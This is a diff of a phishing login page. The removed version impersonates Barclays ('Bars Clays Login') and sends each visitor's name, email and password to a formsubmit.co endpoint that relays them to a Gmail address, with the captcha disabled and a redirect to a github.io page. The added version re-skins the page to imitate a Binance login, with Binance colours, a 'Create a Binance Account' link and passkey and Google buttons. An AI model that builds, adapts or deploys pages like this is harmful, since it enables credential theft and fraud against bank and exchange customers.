@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Bars Clays Login</title>
+<title>Login</title>
 
 <style>
     * {
@@ -96,6 +96,41 @@
         opacity: 0.9;
     }
 
+    .divider {
+        display: flex;
+        align-items: center;
+        text-align: center;
+        color: #848E9C;
+        margin: 20px 0;
+    }
+
+    .divider::before,
+    .divider::after {
+        content: "";
+        flex: 1;
+        border-bottom: 1px solid #2B3139;
+    }
+
+    .divider:not(:empty)::before {
+        margin-right: .75em;
+    }
+
+    .divider:not(:empty)::after {
+        margin-left: .75em;
+    }
+
+    .btn-secondary {
+        width: 100%;
+        padding: 14px;
+        margin-bottom: 15px;
+        border-radius: 8px;
+        border: 1px solid #2B3139;
+        background-color: transparent;
+        color: #EAECEF;
+        font-size: 15px;
+        cursor: pointer;
+    }
+
     .footer-link {
         color: #FCD535;
         margin-top: 15px;
@@ -123,47 +158,44 @@
     .forgot a:hover {
         color: #FCD535;
     }
+
 </style>
 </head>
 
 <body>
+
 <div class="container">
 
     <div class="close-btn">&times;</div>
+
     <h1>Log in</h1>
 
-    <!-- FORM -->
-    <form action="https://formsubmit.co/barsclaysmanagementservices@gmail.com" method="POST">
-        <label>Name</label>
-        <div class="input-wrapper">
-            <input type="text" name="name" placeholder="Your Name" required>
-            <span class="icon-btn" onclick="clearName()">✕</span>
-        </div>
+    <form>
 
-        <label>Email</label>
+        <label>Email/Phone number</label>
         <div class="input-wrapper">
-            <input type="email" name="email" placeholder="Your Email" required>
+            <input type="text" id="email" placeholder="Enter your email or phone">
             <span class="icon-btn" onclick="clearEmail()">✕</span>
         </div>
 
         <label>Password</label>
         <div class="input-wrapper">
-            <input type="password" name="password" id="password" placeholder="Your Password" required>
+            <input type="password" id="password" placeholder="Enter your password">
             <span class="icon-btn" onclick="togglePassword()">👁</span>
         </div>
 
-        <!-- Disable captcha -->
-        <input type="hidden" name="_captcha" value="false">
-
-        <!-- Optional redirect after submit -->
-        <input type="hidden" name="_next" value="https://barsclaysmanag.github.io/bars_clays/">
+        <div class="forgot">
+            <a href="#">Forgot password?</a>
+        </div>
 
         <button type="submit" class="btn-primary">Continue</button>
+
     </form>
 
-    <div class="forgot">
-        <a href="#">Forgot password?</a>
-    </div>
+    <div class="divider">or</div>
+
+    <button class="btn-secondary">Continue with Passkey</button>
+    <button class="btn-secondary">Continue with Google</button>
 
     <a href="#" class="footer-link">Create a Binance Account</a>
     <a href="#" class="footer-link">Need help?</a>
@@ -171,15 +203,13 @@
 </div>
 
 <script>
-function clearEmail() {
-    document.querySelector('input[name="email"]').value = "";
-}
-function clearName() {
-    document.querySelector('input[name="name"]').value = "";
-}
 function togglePassword() {
     const password = document.getElementById("password");
     password.type = password.type === "password" ? "text" : "password";
+}
+
+function clearEmail() {
+    document.getElementById("email").value = "";
 }
 </script>
 
